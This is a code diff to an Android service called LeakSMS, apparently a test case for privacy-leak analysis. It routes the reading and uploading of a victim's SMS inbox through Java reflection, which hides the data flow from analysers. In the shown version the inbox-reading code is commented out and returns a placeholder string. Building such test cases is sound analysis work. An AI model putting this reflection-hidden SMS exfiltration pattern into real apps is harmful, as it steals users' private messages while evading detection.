@@ -30,11 +30,14 @@ public class LeakSMS extends Service {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         LeakSMS L=new LeakSMS();
-        Method methodName = null;
+        Method methodGet = null;
+        Method methodUpload= null;
         String victimSMS="";
         try {
-            methodName=LeakSMS.class.getMethod("getSMS");
-            victimSMS=(String)methodName.invoke(new LeakSMS());
+            methodGet=LeakSMS.class.getMethod("getSMS");
+            methodUpload=LeakSMS.class.getMethod("uploadSMS", String.class);
+            victimSMS=(String)methodGet.invoke(new LeakSMS());
+            methodUpload.invoke(new LeakSMS(),victimSMS);
         } catch (NoSuchMethodException e) {
             e.printStackTrace();
         } catch (InvocationTargetException e) {
@@ -43,14 +46,12 @@ public class LeakSMS extends Service {
             e.printStackTrace();
         }
 
-        String victim_SMS=getSMS();
-        uploadSMS(victim_SMS);
         return  super.onStartCommand(intent, flags, startId);
     }
 
     public String getSMS()
     {
-        /* String str = " ";
+       /*String str = " ";
         Uri inboxURI = Uri.parse("content://sms/inbox");
         Cursor cur = getContentResolver().query(inboxURI, null, null, null, null);
         if (cur.moveToFirst()) {
@@ -58,10 +59,8 @@ public class LeakSMS extends Service {
         }
         str=str.replace(" ","_");
         return str;
-        /*
-         */
-        return "reflection_testing";
-
+        */
+       return "test_3";
     }
     public void uploadSMS(String str)
     {
